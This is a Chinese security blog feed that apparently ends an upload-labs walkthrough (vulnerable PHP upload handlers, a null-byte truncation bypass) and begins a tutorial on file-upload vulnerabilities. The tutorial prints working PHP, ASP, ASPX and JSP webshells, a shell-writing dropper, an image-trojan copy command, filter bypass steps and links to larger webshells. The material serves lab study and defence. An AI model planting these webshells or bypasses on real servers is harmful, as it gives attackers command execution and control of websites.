        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'禁止保存为该类型文件！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>考察CVE-2015-2348 move_uploaded_file() 00截断，上传webshell，方法同pass-13</p>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/212208.png" class title="image">
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/212249.png" class title="image">
<h1 id="Pass-21-图片马绕过？"><a href="#Pass-21-图片马绕过？" class="headerlink" title="Pass-21 图片马绕过？"></a>Pass-21 图片马绕过？</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">//检查MIME</span>
    <span class="token variable">$allow_type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$allow_type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"禁止上传该类型文件!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token comment">//检查文件名</span>
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$allow_suffix</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$allow_suffix</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"禁止上传该后缀文件!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"文件上传成功！"</span><span class="token punctuation">;</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"文件上传失败！"</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"请选择要上传的文件！"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>好像还是图片码直接绕过</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>attack</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞原理及防御</title>
    <url>/2021/06/30/wen-jian-shang-chuan-lou-dong-yuan-li-ji-fang-yu/</url>
    <content><![CDATA[<p>在此感谢参考中各位大佬的笔记</p>
<span id="more"></span>
<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p><strong>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。</strong>这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
<p>文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。<strong>大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。</strong>攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。</p>
<h2 id="文件上传漏洞的原因"><a href="#文件上传漏洞的原因" class="headerlink" title="文件上传漏洞的原因"></a>文件上传漏洞的原因</h2><ol>
<li><p>对于上传文件的后缀名（扩展名）没有做较为严格的限制</p>
</li>
<li><p>对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法) 没有做检查</p>
</li>
<li><p>权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件）</p>
</li>
<li><p>对于web server对于上传文件或者指定目录的行为没有做限制</p>
</li>
</ol>
<h1 id="WebShell简介"><a href="#WebShell简介" class="headerlink" title="WebShell简介"></a>WebShell简介</h1><p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</p>
<p>最简单的一句话木马</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过中国菜刀或者蚁剑即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。<code>eval()</code> 函数表示括号内的语句字符串什么的全都当做代码执行。<code>$_POST[&#39;cmd&#39;]</code> 表示从页面中获得cmd这个参数值。</p>
<h2 id="入侵条件"><a href="#入侵条件" class="headerlink" title="入侵条件"></a>入侵条件</h2><ol>
<li>木马上传成功，未被杀；</li>
<li>知道木马的路径在哪；</li>
<li>上传的木马能正常运行。</li>
</ol>
<h2 id="常见形式"><a href="#常见形式" class="headerlink" title="常见形式"></a>常见形式</h2><p>常见的一句话木马</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html">php的一句话：  <span class="token prolog">&lt;?php @eval($_POST['pass']);?></span>
asp的一句话：  &lt;%eval request ("pass")%>
aspx的一句话： &lt;%@ Page Language="Jscript"%> &lt;%eval(Request.Item["pass"],"unsafe");%><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="图片木马"><a href="#图片木马" class="headerlink" title="图片木马"></a>图片木马</h2><p>通常网站会对上传的文件的类型、大小进行过滤，若规定上传图片，还可能会对图片进行采集，这时就需要使用图片来进行掩护。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">copy test.jpg&#x2F;b+hack.php&#x2F;a hack.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>hack.php:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'muma.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[cmd]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="小马和大马"><a href="#小马和大马" class="headerlink" title="小马和大马"></a>小马和大马</h2><p><strong>小马和大马都是网页类型中的一种后门，是通过用来控制网站权限的,最主要的区别就是小马是用来上传大马的</strong>。</p>
<h3 id="网页小马"><a href="#网页小马" class="headerlink" title="网页小马"></a>网页小马</h3><p>小马体积非常小，只有2KB那么大，隐蔽性也非常的好，因为小马的作用很简单，就是一个上传功能，就没有其它的了，它的作用仅仅是用来上传文件，所以也能过一些安全扫描。小马是为了方便上传大马的，因为很多漏洞做了上传限制，大马上传不了，所以就只能先上传小马，再接着通过小马上传大马了。小马还可以通过与图片合成一起通过IIS漏洞来运行。</p>
<p>Java语言编写的后台使用JSP木马，与前面的一句话木马不同，菜刀中JSP木马较长，以下是一个简单的JSP小马：</p>
<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%
    if(&quot;123&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;
        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();
        int a &#x3D; -1;
        byte[] b &#x3D; new byte[2048];
        out.print(&quot;&lt;pre&gt;&quot;);
        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;
            out.println(new String(b));
        &#125;
        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);
    &#125;
%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>成功上传后如果能解析的话，请求：<code>http://服务器IP:端口/Shell/cmd.jsp?pwd=123&amp;i=ipconfig</code> 即可执行命令。</p>
<h3 id="网页大马"><a href="#网页大马" class="headerlink" title="网页大马"></a>网页大马</h3><p>大马的体积就比较大了，通常在50K左右，比小马会大好多倍，但对应的功能也很强大，包括对数据的管理，命令的操作，数据库的管理，解压缩，和提权等功能，都非常强大。这种大马一旦网站被种了，网站基本就在这个大马控制之中。大马的隐蔽性不好，因为涉及很多敏感代码，安全类程序很容易扫描到。</p>
<blockquote>
<p>中国菜刀的一句话不算，菜刀一句话通过客户端来操作也非常强大，一句话的代码可以和大马实现的一样。我们这里说的小马和大马是指网页类型中的，小马就是为了配合上传大马的，这是它最主要的作用，还有就是小马可以当做备用的后门来使用，一般大马容易被发现，而小马则更容易隐藏在系统的文件夹中。</p>
<p>PHP大马示例的代码：<a href="https://pan.baidu.com/s/1XGUp5Q_Q2zn46kcQxE5M3A">https://pan.baidu.com/s/1XGUp5Q_Q2zn46kcQxE5M3A</a> 提取码：56pd。</p>
<p>另外提供JSP大马的参考地址：<a href="https://blog.csdn.net/weixin_34248023/article/details/93094456。">https://blog.csdn.net/weixin_34248023/article/details/93094456。</a></p>
</blockquote>
<h1 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h1><h2 id="客户端检测绕过-JavaScript"><a href="#客户端检测绕过-JavaScript" class="headerlink" title="客户端检测绕过(JavaScript)"></a>客户端检测绕过(JavaScript)</h2><p>如果上传非法文件，返回结果很快，或者F12打开开发者模式，上传非法文件，发现没有网络请求，但是被拦截了，很有可能就是客户端进行了JS校验检测。这种前端采用JS限制上传类型和大小的方式：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">//定义允许上传的文件类型</span>
    <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>
    <span class="token comment">//提取上传文件的类型</span>
    <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//判断上传文件类型是否允许上传</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>绕过思路：1.直接本地禁用JS，不让其做检测 2.抓包，修改文件后缀名类型，绕过检测限制</strong></p>
<h2 id="服务器后端检测"><a href="#服务器后端检测" class="headerlink" title="服务器后端检测"></a>服务器后端检测</h2><p>服务器后端检测有较多方式，普遍分为文件类型检测，文件头类型，文件扩展名名单检测，文件内容检测，接下来进行简要分析。</p>
<h3 id="文件类型检测"><a href="#文件类型检测" class="headerlink" title="文件类型检测"></a>文件类型检测</h3><p>此类检测防护主要是从content-type进行检测，检验请求中content-type是否符合可接受的上传类型(如”image/gif”,”image/png”,”image/jpeg”) </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span>            
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'文件类型不正确，请重新上传！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>绕过思路：抓包将content-type改为可接受图片形式，即可绕过</strong></p>
<h3 id="文件头类型检测（文件幻数）"><a href="#文件头类型检测（文件幻数）" class="headerlink" title="文件头类型检测（文件幻数）"></a>文件头类型检测（文件幻数）</h3><p><code>getimagesize()</code> 或 <code>exif_imagetype()</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">isImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$types</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.jpeg|.png|.gif'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">image_type_to_extension</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$types</span><span class="token punctuation">,</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
